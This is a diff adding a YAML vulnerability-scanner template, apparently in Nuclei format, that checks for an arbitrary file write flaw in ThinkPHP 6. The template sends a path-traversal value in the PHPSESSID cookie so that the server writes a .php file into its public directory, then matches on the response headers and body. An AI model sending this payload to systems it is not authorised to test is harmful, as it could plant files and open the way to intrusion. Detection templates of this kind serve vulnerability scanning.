@@ -1,0 +1,31 @@
+id: thinkphp6-file-write
+info:
+  name: ThinkPHP 6 Arbitrary File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-write, critical
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=../../../../public/{{randstr_9}}.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "set-cookie"
+      - type: word
+        part: body
+        words:
+          - "{"
+        negative: true
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
